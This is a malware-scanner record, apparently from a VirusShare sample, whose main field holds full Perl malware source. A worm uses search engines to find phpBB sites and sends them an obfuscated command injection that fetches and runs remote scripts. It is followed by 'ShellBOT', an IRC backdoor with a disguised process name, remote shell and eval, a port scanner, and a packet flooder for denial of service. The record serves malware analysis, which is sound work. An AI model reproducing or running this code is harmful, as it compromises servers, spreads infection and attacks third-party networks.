{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "SHELL": "May run an executable file or a system command",
            "chr": "May attempt to obfuscate specific str",
            "open": "May open a file"
        },
        "macro": "#/usr/bin/perl\n\nuse IO::Socket;\nuse LWP::Simple;\nmy $processo = \"/usr/bin/httpd -DSSL\";\n$0=\"$processo\".\"\\0\"x16;;\nmy $pid=fork;\nexit if $pid;\ndie \"Problema com o fork: $!\" unless defined($pid);\n\nwhile(1){\n@vul = \"\";\n$a=0;\n$numero = int rand(999);\n$site = \"www.google.com\";\n$procura = \"inurl:viewtopic.php?t=$numero\";\n\n######################################\nfor($n=0;$n<90;$n += 10){\n$sock = IO::Socket::INET->new(PeerAddr=>\"$site\",PeerPort=>\"80\",Proto=>\"tcp\") or next;\nprint $sock \"GET /search?q=$procura&start=$n HTTP/1.0\\n\\n\";\n@resu = <$sock>;\nclose($sock);\n$ae = \"@resu\";\nwhile ($ae=~ m/<a href=.*?>.*?<\\/a>/){\n  $ae=~ s/<a href=(.*?)>.*?<\\/a>/$1/;\n  $uber=$1;\nif ($uber !~/translate/)\n{if ($uber !~ /cache/)\n{if ($uber !~ /\"/)\n{if ($uber !~ /google/)\n{if ($uber !~ /216/)\n{if ($uber =~/http/)\n{if ($uber !~ /start=/)\n{\nif ($uber =~/&/)\n   {\n   $nu = index $uber, '&';\n   $uber = substr($uber,0,$nu);\n   }\n$vul[$a] = $uber;\n$a++;\n}}}}}}}}}\n##########################\nfor($cadenu=1;$cadenu <= 99; $cadenu +=10){\n\n@cade = get(\"http://cade.search.yahoo.com/search?p=$procura&ei=UTF-8&fl=0&all=1&pstart=1&b=$cadenu\") or next;\n$ae = \"@cade\";\n\nwhile ($ae=~ m/<em class=yschurl>.*?<\\/em>/){\n  $ae=~ s/<em class=yschurl>(.*?)<\\/em>/$1/;\n  $uber=$1;\n  \n$uber =~ s/ //g;\n$uber =~ s/<b>//g;\n$uber =~ s/<\\/b>//g;\n$uber =~ s/<wbr>//g;\n\nif ($uber =~/&/)\n   {\n   $nu = index $uber, '&';\n   $uber = substr($uber,0,$nu);\n   }\n$vul[$a] = $uber;\n$a++\n}}\n\n#########################\n\n$cmd = '&highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(119)%252echr(119)%252echr(119)%252echr(46)%252echr(116)%252echr(101)%252echr(110)%252echr(104)%252echr(97)%252echr(115)%252echr(101)%252echr(117)%252echr(115)%252echr(105)%252echr(116)%252echr(101)%252echr(46)%252echr(99)%252echr(111)%252echr(109)%252echr(47)%252echr(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(112)%252echr(101)%252echr(114)%252echr(108)%252echr(32)%252echr(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(119)%252echr(119)%252echr(119)%252echr(46)%252echr(116)%252echr(101)%252echr(110)%252echr(104)%252echr(97)%252echr(115)%252echr(101)%252echr(117)%252echr(115)%252echr(105)%252echr(116)%252echr(101)%252echr(46)%252echr'.'(99)%252echr(111)%252echr(109)%252echr(47)%252echr(119)%252echr(111)%252echr(114)%252echr(109)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(112)%252echr(101)%252echr(114)%252echr(108)%252echr(32)%252echr(119)%252echr(111)%252echr(114)%252echr(109)%252echr(46)%252echr(116)%252echr(120)%252echr(116))%252e%2527';\n\n$b = scalar(@vul);\n\nfor($a=0;$a<=$b;$a++)\n{\n\n$sitevul = $vul[$a] . $cmd;\nif($sitevul !~/http/){ $sitevul = 'http://' . $sitevul; }\n$res = get($sitevul) or next;\n}\n\n}\n\n#!/usr/bin/perl\n#\n# ShellBOT - Atrix Team\n#\n# 0ldW0lf - oldwolf_at_atrix-team.org\n# - www.atrix-team.org\n# - www.atrix.cjb.net\n#\n#\n################ CONFIGURACAO #################################################################\nmy $processo = '/usr/local/apache/bin/httpd -DSSL'; # Nome do processo que vai aparece no ps #\n#----------------------------------------------################################################\nmy $linas_max='8'; # Evita o flood :) depois de X linhas #\n#----------------------------------------------################################################\nmy $sleep='4'; # ele dorme X segundos #\n##################### IRC #####################################################################\nmy @adms=(\"ssh\"); # Nick do administrador #\n#----------------------------------------------################################################\nmy @canais=(\"#ssh echo\"); # Caso haja senha (\"#canal :senha\") #\n#----------------------------------------------################################################\nmy $nick='sshd'; # Nick do bot. Caso esteja em uso vai aparecer #\n                                               # aparecer com numero radonamico no final #\n#----------------------------------------------################################################\nmy $ircname = 'ssh'; # User ID #\n#----------------------------------------------################################################\nchop (my $realname = `uname -a`); # Full Name #\n#----------------------------------------------################################################\n$servidor='ssh.gigachat.net' unless $servidor; # Servidor de irc que vai ser usado #\n                                               # caso n\ufffdo seja especificado no argumento #\n#----------------------------------------------################################################\nmy $porta='6667'; # Porta do servidor de irc #\n################ ACESSO A SHELL ###############################################################\nmy $secv = 1; # 1/0 pra habilita/desabilita acesso a shell #\n###############################################################################################\n\nmy $VERSAO = '0.2';\n\n$SIG{'INT'} = 'IGNORE';\n$SIG{'HUP'} = 'IGNORE';\n$SIG{'TERM'} = 'IGNORE';\n$SIG{'CHLD'} = 'IGNORE';\n$SIG{'PS'} = 'IGNORE';\n\nuse IO::Socket;\nuse Socket;\nuse IO::Select;\nchdir(\"/\");\n$servidor=\"$ARGV[0]\" if $ARGV[0];\n$0=\"$processo\".\"\\0\"x16;;\nmy $pid=fork;\nexit if $pid;\ndie \"Problema com o fork: $!\" unless defined($pid);\n\nmy $dcc_sel = new IO::Select->new();\n\n#############################\n# B0tchZ na veia ehehe :P #\n#############################\n\n$sel_cliente = IO::Select->new();\nsub sendraw {\n  if ($#_ == '1') {\n    my $socket = $_[0];\n    print $socket \"$_[1]\\n\";\n  } else {\n      print $IRC_cur_socket \"$_[0]\\n\";\n  }\n}\n\nsub conectar {\n   my $meunick = $_[0];\n   my $servidor_con = $_[1];\n   my $porta_con = $_[2];\n\n   my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);\n   if (defined($IRC_socket)) {\n     $IRC_cur_socket = $IRC_socket;\n\n     $IRC_socket->autoflush(1);\n     $sel_cliente->add($IRC_socket);\n\n     $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";\n     $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";\n     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;\n     nick(\"$meunick\");\n     sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");\n     sleep 1;\n   }\n\n}\nmy $line_temp;\nwhile( 1 ) {\n   while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }\n   delete($irc_servers{''}) if (defined($irc_servers{''}));\n   &DCC::connections;\n   my @ready = $sel_cliente->can_read(0);\n   next unless(@ready);\n   foreach $fh (@ready) {\n     $IRC_cur_socket = $fh;\n     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};\n     $nread = sysread($fh, $msg, 4096);\n     if ($nread == 0) {\n        $sel_cliente->remove($fh);\n        $fh->close;\n        delete($irc_servers{$fh});\n     }\n     @lines = split (/\\n/, $msg);\n\n     for(my $c=0; $c<= $#lines; $c++) {\n       $line = $lines[$c];\n       $line=$line_temp.$line if ($line_temp);\n       $line_temp='';\n       $line =~ s/\\r$//;\n       unless ($c == $#lines) {\n         parse(\"$line\");\n       } else {\n           if ($#lines == 0) {\n             parse(\"$line\");\n           } elsif ($lines[$c] =~ /\\r$/) {\n               parse(\"$line\");\n           } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {\n               parse(\"$line\");\n           } else {\n               $line_temp = $line;\n           }\n       }\n      }\n   }\n}\n\n \nsub parse {\n   my $servarg = shift;\n   if ($servarg =~ /^PING \\:(.*)/) {\n     sendraw(\"PONG :$1\");\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {\n       my $pn=$1; my $onde = $4; my $args = $5;\n       if ($args =~ /^\\001VERSION\\001$/) {\n         notice(\"$pn\", \"\\001VERSION ShellBOT-$VERSAO por 0ldW0lf\\001\");\n       }\n       if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms) {\n         if ($onde eq \"$meunick\"){\n           shell(\"$pn\", \"$args\");\n         }\n         if ($args =~ /^(\\Q$meunick\\E|\\!atrix)\\s+(.*)/ ) {\n            my $natrix = $1;\n            my $arg = $2;\n            if ($arg =~ /^\\!(.*)/) {\n              ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!atrix\" and $arg =~ /^\\!nick/);\n            } elsif ($arg =~ /^\\@(.*)/) {\n                $ondep = $onde;\n                $ondep = $pn if $onde eq $meunick;\n                bfunc(\"$ondep\",\"$1\");\n            } else {\n                shell(\"$onde\", \"$arg\");\n            }\n         }\n       }\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {\n       if (lc($1) eq lc($meunick)) {\n         $meunick=$4;\n         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n       }\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {\n       nick(\"$meunick\".int rand(9999));\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {\n       $meunick = $2;\n       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n       $irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";\n       foreach my $canal (@canais) {\n         sendraw(\"JOIN $canal\");\n       }\n   }\n}\n\nsub bfunc {\n  my $printl = $_[0];\n  my $funcarg = $_[1];\n  if (my $pid = fork) {\n     waitpid($pid, 0);\n  } else {\n      if (fork) {\n         exit;\n       } else {\n           if ($funcarg =~ /^portscan (.*)/) {\n             my $hostip=\"$1\";\n             my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"80\",\"110\",\"143\");\n             my (@aberta, %porta_banner);\n             foreach my $porta (@portas) {\n                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);\n                if ($scansock) {\n                   push (@aberta, $porta);\n                   $scansock->close;\n                }\n             }\n\n             if (@aberta) {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :portas abertas: @aberta\");\n             } else {\n                 sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada\");\n             }\n           }\n           if ($funcarg =~ /^pacota\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n             my ($dtime, %pacotes) = attacker(\"$1\", \"$2\", \"$3\");\n             $dtime = 1 if $dtime == 0;\n             my %bytes;\n             $bytes{igmp} = $2 * $pacotes{igmp};\n             $bytes{icmp} = $2 * $pacotes{icmp};\n             $bytes{o} = $2 * $pacotes{o};\n             $bytes{udp} = $2 * $pacotes{udp};\n             $bytes{tcp} = $2 * $pacotes{tcp};\n            \n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002 - Status GERAL -\\002\");\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo\\002: $dtime\".\"s\");\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total pacotes\\002: \".($pacotes{udp} + $pacotes{igmp} + $pacotes{icmp} + $pacotes{o}));\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total bytes\\002: \".($bytes{icmp} + $bytes {igmp} + $bytes{udp} + $bytes{o}));\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002M\ufffddia de envio\\002: \".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)/$dtime).\" kbps\");\n\n           }\n           exit;\n       }\n  }\n}\n \nsub ircase {\n  my ($kem, $printl, $case) = @_;\n\n  if ($case =~ /^join (.*)/) {\n     j(\"$1\");\n   }\n   if ($case =~ /^part (.*)/) {\n      p(\"$1\");\n   }\n   if ($case =~ /^rejoin\\s+(.*)/) {\n      my $chan = $1;\n      if ($chan =~ /^(\\d+) (.*)/) {\n        for (my $ca = 1; $ca <= $1; $ca++ ) {\n          p(\"$2\");\n          j(\"$2\");\n        }\n      } else {\n          p(\"$chan\");\n          j(\"$chan\");\n      }\n   }\n   if ($case =~ /^op/) {\n      op(\"$printl\", \"$kem\") if $case eq \"op\";\n      my $oarg = substr($case, 3);\n      op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   if ($case =~ /^deop/) {\n      deop(\"$printl\", \"$kem\") if $case eq \"deop\";\n      my $oarg = substr($case, 5);\n      deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   if ($case =~ /^voice/) {\n      voice(\"$printl\", \"$kem\") if $case eq \"voice\";\n      $oarg = substr($case, 6);\n      voice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   if ($case =~ /^devoice/) {\n      devoice(\"$printl\", \"$kem\") if $case eq \"devoice\";\n      $oarg = substr($case, 8);\n      devoice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   if ($case =~ /^msg\\s+(\\S+) (.*)/) {\n      msg(\"$1\", \"$2\");\n   }\n   if ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n        msg(\"$2\", \"$3\");\n      }\n   }\n   if ($case =~ /^ctcp\\s+(\\S+) (.*)/) {\n      ctcp(\"$1\", \"$2\");\n   }\n   if ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n        ctcp(\"$2\", \"$3\");\n      }\n   }\n   if ($case =~ /^invite\\s+(\\S+) (.*)/) {\n      invite(\"$1\", \"$2\");\n   }\n   if ($case =~ /^nick (.*)/) {\n      nick(\"$1\");\n   }\n   if ($case =~ /^conecta\\s+(\\S+)\\s+(\\S+)/) {\n       conectar(\"$2\", \"$1\", 6667);\n   }\n   if ($case =~ /^send\\s+(\\S+)\\s+(\\S+)/) {\n      DCC::SEND(\"$1\", \"$2\");\n   }\n   if ($case =~ /^raw (.*)/) {\n      sendraw(\"$1\");\n   }\n   if ($case =~ /^eval (.*)/) {\n     eval \"$1\";\n   }\n}\nsub shell {\n  return unless $secv;\n  my $printl=$_[0];\n  my $comando=$_[1];\n  if ($comando =~ /cd (.*)/) {\n    chdir(\"$1\") || msg(\"$printl\", \"Diert\ufffdrio inexistente!\");\n    return;\n  }\n  elsif ($pid = fork) {\n     waitpid($pid, 0);\n  } else {\n      if (fork) {\n         exit;\n       } else {\n           my @resp=`$comando 2>&1 3>&1`;\n           my $c=0;\n           foreach my $linha (@resp) {\n             $c++;\n             chop $linha;\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");\n             if ($c == \"$linas_max\") {\n               $c=0;\n               sleep $sleep;\n             }\n           }\n           exit;\n       }\n  }\n}\n\n#eu fiz um pacotadorzinhu e talz.. dai colokemo ele aki\nsub attacker {\n  my $iaddr = inet_aton($_[0]);\n  my $msg = 'B' x $_[1];\n  my $ftime = $_[2];\n  my $cp = 0;\n  my (%pacotes);\n  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;\n  \n  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;\n  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;\n  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;\n  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;\n  return(undef) if $cp == 4;\n  my $itime = time;\n  my ($cur_time);\n  while ( 1 ) {\n     for (my $porta = 1; $porta <= 65535; $porta++) {\n       $cur_time = time - $itime;\n       last if $cur_time >= $ftime;\n       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;\n       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;\n       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;\n       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;\n\n       # DoS ?? :P\n       for (my $pc = 3; $pc <= 255;$pc++) {\n         next if $pc == 6;\n         $cur_time = time - $itime;\n         last if $cur_time >= $ftime;\n         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;\n         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;;\n       }\n     }\n     last if $cur_time >= $ftime;\n  }\n  return($cur_time, %pacotes);\n}\n\n#############\n# ALIASES #\n#############\n\nsub action {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :\\001ACTION $_[1]\\001\");\n}\n\nsub ctcp {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");\n}\nsub msg {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :$_[1]\");\n}\n\nsub notice {\n   return unless $#_ == 1;\n   sendraw(\"NOTICE $_[0] :$_[1]\");\n}\n\nsub op {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +o $_[1]\");\n}\nsub deop {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -o $_[1]\");\n}\nsub hop {\n    return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +h $_[1]\");\n}\nsub dehop {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +h $_[1]\");\n}\nsub voice {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +v $_[1]\");\n}\nsub devoice {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -v $_[1]\");\n}\nsub ban {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +b $_[1]\");\n}\nsub unban {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -b $_[1]\");\n}\nsub kick {\n   return unless $#_ == 1;\n   sendraw(\"KICK $_[0] $_[1] :$_[2]\");\n}\n\nsub modo {\n   return unless $#_ == 0;\n   sendraw(\"MODE $_[0] $_[1]\");\n}\nsub mode { modo(@_); }\n\nsub j { &join(@_); }\nsub join {\n   return unless $#_ == 0;\n   sendraw(\"JOIN $_[0]\");\n}\nsub p { part(@_); }\nsub part {sendraw(\"PART $_[0]\");}\n\nsub nick {\n  return unless $#_ == 0;\n  sendraw(\"NICK $_[0]\");\n}\n\nsub invite {\n   return unless $#_ == 1;\n   sendraw(\"INVITE $_[1] $_[0]\");\n}\nsub topico {\n   return unless $#_ == 1;\n   sendraw(\"TOPIC $_[0] $_[1]\");\n}\nsub topic { topico(@_); }\n\nsub whois {\n  return unless $#_ == 0;\n  sendraw(\"WHOIS $_[0]\");\n}\nsub who {\n  return unless $#_ == 0;\n  sendraw(\"WHO $_[0]\");\n}\nsub names {\n  return unless $#_ == 0;\n  sendraw(\"NAMES $_[0]\");\n}\nsub away {\n  sendraw(\"AWAY $_[0]\");\n}\nsub back { away(); }\nsub quit {\n  sendraw(\"QUIT :$_[0]\");\n}\n\n# DCC\npackage DCC;\n\nsub connections {\n   my @ready = $dcc_sel->can_read(1);\n# return unless (@ready);\n   foreach my $fh (@ready) {\n     my $dcctipo = $DCC{$fh}{tipo};\n     my $arquivo = $DCC{$fh}{arquivo};\n     my $bytes = $DCC{$fh}{bytes};\n     my $cur_byte = $DCC{$fh}{curbyte};\n     my $nick = $DCC{$fh}{nick};\n\n     my $msg;\n     my $nread = sysread($fh, $msg, 10240);\n\n     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {\n        $DCC{$fh}{status} = \"Cancelado\";\n        $DCC{$fh}{ftime} = time;\n        $dcc_sel->remove($fh);\n        $fh->close;\n        next;\n     }\n\n     if ($dcctipo eq \"get\") {\n        $DCC{$fh}{curbyte} += length($msg);\n\n        my $cur_byte = $DCC{$fh}{curbyte};\n\n        open(FILE, \">> $arquivo\");\n        print FILE \"$msg\" if ($cur_byte <= $bytes);\n        close(FILE);\n\n        my $packbyte = pack(\"N\", $cur_byte);\n        print $fh \"$packbyte\";\n\n        if ($bytes == $cur_byte) {\n           $dcc_sel->remove($fh);\n           $fh->close;\n           $DCC{$fh}{status} = \"Recebido\";\n           $DCC{$fh}{ftime} = time;\n           next;\n        }\n     } elsif ($dcctipo eq \"send\") {\n          my $send = $fh->accept;\n          $send->autoflush(1);\n          $dcc_sel->add($send);\n          $dcc_sel->remove($fh);\n          $DCC{$send}{tipo} = 'sendcon';\n          $DCC{$send}{itime} = time;\n          $DCC{$send}{nick} = $nick;\n          $DCC{$send}{bytes} = $bytes;\n          $DCC{$send}{curbyte} = 0;\n          $DCC{$send}{arquivo} = $arquivo;\n          $DCC{$send}{ip} = $send->peerhost;\n          $DCC{$send}{porta} = $send->peerport;\n          $DCC{$send}{status} = \"Enviando\";\n\n          #de cara manda os primeiro 1024 bytes do arkivo.. o resto fik com o sendcon\n          open(FILE, \"< $arquivo\");\n          my $fbytes;\n          read(FILE, $fbytes, 1024);\n          print $send \"$fbytes\";\n          close FILE;\n# delete($DCC{$fh});\n     } elsif ($dcctipo eq 'sendcon') {\n          my $bytes_sended = unpack(\"N\", $msg);\n          $DCC{$fh}{curbyte} = $bytes_sended;\n          if ($bytes_sended == $bytes) {\n             $fh->close;\n             $dcc_sel->remove($fh);\n             $DCC{$fh}{status} = \"Enviado\";\n             $DCC{$fh}{ftime} = time;\n             next;\n          }\n          open(SENDFILE, \"< $arquivo\");\n          seek(SENDFILE, $bytes_sended, 0);\n          my $send_bytes;\n          read(SENDFILE, $send_bytes, 1024);\n          print $fh \"$send_bytes\";\n          close(SENDFILE);\n     }\n   }\n}\n\nsub SEND {\n  my ($nick, $arquivo) = @_;\n  unless (-r \"$arquivo\") {\n    return(0);\n  }\n \n  my $dccark = $arquivo;\n  $dccark =~ s/[.*\\/](\\S+)/$1/;\n\n  my $meuip = $::irc_servers{\"$::IRC_cur_socket\"}{'meuip'};\n  my $longip = unpack(\"N\",inet_aton($meuip));\n\n  my @filestat = stat($arquivo);\n  my $size_total=$filestat[7];\n  if ($size_total == 0) {\n     return(0);\n  }\n\n  my ($porta, $sendsock);\n  do {\n    $porta = int rand(64511);\n    $porta += 1024;\n    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);\n  } until $sendsock;\n\n  $DCC{$sendsock}{tipo} = 'send';\n  $DCC{$sendsock}{nick} = $nick;\n  $DCC{$sendsock}{bytes} = $size_total;\n  $DCC{$sendsock}{arquivo} = $arquivo;\n\n  &::ctcp(\"$nick\", \"DCC SEND $dccark $longip $porta $size_total\");\n\n}\n\nsub GET {\n  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;\n  return(0) if (-e \"$arquivo\");\n  if (open(FILE, \"> $arquivo\")) {\n     close FILE;\n  } else {\n    return(0);\n  }\n\n  my $dccip=fixaddr($dcclongip);\n  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);\n  my $dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);\n  $dccsock->autoflush(1);\n  $dcc_sel->add($dccsock);\n  $DCC{$dccsock}{tipo} = 'get';\n  $DCC{$dccsock}{itime} = time;\n  $DCC{$dccsock}{nick} = $nick;\n  $DCC{$dccsock}{bytes} = $bytes;\n  $DCC{$dccsock}{curbyte} = 0;\n  $DCC{$dccsock}{arquivo} = $arquivo;\n  $DCC{$dccsock}{ip} = $dccip;\n  $DCC{$dccsock}{porta} = $dccporta;\n  $DCC{$dccsock}{status} = \"Recebendo\";\n}\n\n# po fico xato de organiza o status.. dai fiz ele retorna o status de acordo com o socket.. dai o ADM.pl lista os sockets e faz as perguntas\nsub Status {\n  my $socket = shift;\n  my $sock_tipo = $DCC{$socket}{tipo};\n  unless (lc($sock_tipo) eq \"chat\") {\n    my $nick = $DCC{$socket}{nick};\n    my $arquivo = $DCC{$socket}{arquivo};\n    my $itime = $DCC{$socket}{itime};\n    my $ftime = time;\n    my $status = $DCC{$socket}{status};\n    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});\n\n    my $d_time = $ftime-$itime;\n\n    my $cur_byte = $DCC{$socket}{curbyte};\n    my $bytes_total = $DCC{$socket}{bytes};\n\n    my $rate = 0;\n    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;\n    my $porcen = ($cur_byte*100)/$bytes_total;\n\n    my ($r_duv, $p_duv);\n    if ($rate =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {\n       $r_duv = $3; $r_duv++ if $4 >= 5;\n       $rate = \"$1\\.$2\".\"$r_duv\";\n    }\n    if ($porcen =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {\n       $p_duv = $3; $p_duv++ if $4 >= 5;\n       $porcen = \"$1\\.$2\".\"$p_duv\";\n    }\n    return(\"$sock_tipo\",\"$status\",\"$nick\",\"$arquivo\",\"$bytes_total\", \"$cur_byte\",\"$d_time\", \"$rate\", \"$porcen\");\n  }\n\n  return(0);\n}\n\n# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)\nsub fixaddr {\n    my ($address) = @_;\n\n    chomp $address; # just in case, sigh.\n    if ($address =~ /^\\d+$/) {\n        return inet_ntoa(pack \"N\", $address);\n    } elsif ($address =~ /^[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}$/) {\n        return $address;\n    } elsif ($address =~ tr/a-zA-Z//) { # Whee! Obfuscation!\n        return inet_ntoa(((gethostbyname($address))[4])[0]);\n    } else {\n        return;\n    }\n} "
    },
    "filename": "VirusShare_03705b0d1b80a285a3e9b8f082fbab7c",
    "filesize": 23375,
    "filetype": "HTML document, ISO-8859 text, with very long lines, with CRLF line terminators",
    "hashes": {
        "md5": "03705b0d1b80a285a3e9b8f082fbab7c",
        "sha1": "d619ed8c0369d560b314ad7c57840e85cd8e7607",
        "sha256": "072854b63a61fd00bb34c38a7ebc8a2edec7655f0cda0187bd9b417397b2b40a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#/usr/bin/perl",
            "use IO::Socket;",
            "use LWP::Simple;",
            "my $processo = \"/usr/bin/httpd -DSSL\";",
            "$0=\"$processo\".\"\\0\"x16;;",
            "my $pid=fork;",
            "exit if $pid;",
            "die \"Problema com o fork: $!\" unless defined($pid);",
            "while(1){",
            "@vul = \"\";",
            "$a=0;",
            "$numero = int rand(999);",
            "$site = \"www.google.com\";",
            "$procura = \"inurl:viewtopic.php?t=$numero\";",
            "######################################",
            "for($n=0;$n<90;$n += 10){",
            "$sock = IO::Socket::INET->new(PeerAddr=>\"$site\",PeerPort=>\"80\",Proto=>\"tcp\") or next;",
            "print $sock \"GET /search?q=$procura&start=$n HTTP/1.0\\n\\n\";",
            "@resu = <$sock>;",
            "close($sock);",
            "$ae = \"@resu\";",
            "while ($ae=~ m/<a href=.*?>.*?<\\/a>/){",
            "  $ae=~ s/<a href=(.*?)>.*?<\\/a>/$1/;",
            "  $uber=$1;",
            "if ($uber !~/translate/)",
            "{if ($uber !~ /cache/)",
            "{if ($uber !~ /\"/)",
            "{if ($uber !~ /google/)",
            "{if ($uber !~ /216/)",
            "{if ($uber =~/http/)",
            "{if ($uber !~ /start=/)",
            "if ($uber =~/&/)",
            "   {",
            "   $nu = index $uber, '&';",
            "   $uber = substr($uber,0,$nu);",
            "   }",
            "$vul[$a] = $uber;",
            "$a++;",
            "}}}}}}}}}",
            "##########################",
            "for($cadenu=1;$cadenu <= 99; $cadenu +=10){",
            "@cade = get(\"http://cade.search.yahoo.com/search?p=$procura&ei=UTF-8&fl=0&all=1&pstart=1&b=$cadenu\") or next;",
            "$ae = \"@cade\";",
            "while ($ae=~ m/<em class=yschurl>.*?<\\/em>/){",
            "  $ae=~ s/<em class=yschurl>(.*?)<\\/em>/$1/;",
            "  $uber=$1;",
            "$uber =~ s/ //g;",
            "$uber =~ s/<b>//g;",
            "$uber =~ s/<\\/b>//g;",
            "$uber =~ s/<wbr>//g;",
            "if ($uber =~/&/)",
            "   {",
            "   $nu = index $uber, '&';",
            "   $uber = substr($uber,0,$nu);",
            "   }",
            "$vul[$a] = $uber;",
            "$a++",
            "#########################",
